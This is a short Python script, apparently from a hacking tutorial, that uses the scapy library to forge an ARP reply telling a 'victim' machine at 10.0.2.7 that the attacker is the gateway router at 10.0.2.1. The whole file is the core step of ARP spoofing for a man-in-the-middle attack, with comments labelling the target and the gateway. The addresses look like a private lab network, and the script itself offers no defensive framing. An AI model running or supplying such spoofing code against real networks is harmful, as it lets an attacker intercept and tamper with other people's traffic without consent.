#!/usr/bin/env python

import scapy.all as scapy

# scapy.ls(scapy.ARP()) # shows scapy options for packet creation

# Target(victim) ip pdst
# Target(victim) mac hwdst
# Gateway(router) ip psrc
packet = scapy.ARP(op=2, pdst="10.0.2.7", hwdst="08:00:27:08:af:07", psrc="10.0.2.1")
# Tell the target computer that we are the Gateway router
scapy.send(packet)